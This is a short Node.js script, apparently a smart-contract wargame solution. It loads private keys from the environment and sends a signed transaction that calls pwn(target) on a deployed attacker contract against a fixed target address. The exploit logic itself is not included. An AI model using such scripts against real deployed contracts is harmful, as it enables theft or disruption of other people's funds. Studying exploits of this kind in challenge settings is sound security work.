require('dotenv').config();
const STAGING_ALCHEMY_KEY = process.env.STAGING_ALCHEMY_KEY;
const PUBLIC_KEY = process.env.PUBLIC_KEY;
const PRIVATE_KEY = process.env.PRIVATE_KEY;

const { createAlchemyWeb3 } = require("@alch/alchemy-web3");
const web3 = createAlchemyWeb3(STAGING_ALCHEMY_KEY);

const contract = require("../artifacts/contracts/Failed.sol/Failed.json");
const contractAddress = "0x5422a97aCcb7f4FdFe7F4B7110833797194A46F4";
const target = "0x68821fE155785483a9c85ae6F5BD04D210eE0b07"
const failedContract = new web3.eth.Contract(contract.abi, contractAddress);

async function pwn() {
  const nonce = await web3.eth.getTransactionCount(PUBLIC_KEY, 'latest'); //get latest nonce

//the transaction
  const tx = {
    'from': PUBLIC_KEY,
    'to': contractAddress,
    'nonce': nonce,
    'gas': 500000,
    'data': failedContract.methods.pwn(target).encodeABI()
  };

  const signPromise = web3.eth.accounts.signTransaction(tx, PRIVATE_KEY)
  signPromise.then((signedTx) => {
      web3.eth.sendSignedTransaction(
        signedTx.rawTransaction,
        function (err, hash) {
          if (!err) {
            console.log(
              "The hash of your transaction is: ",
              hash,
              "\nCheck Alchemy's Mempool to view the status of your transaction!"
            )
          } else {
            console.log(
              "Something went wrong when submitting your transaction:",
              err
            )
          }
        }
      )
    })
    .catch((err) => {
      console.log(" Promise failed:", err)
    })
}

pwn()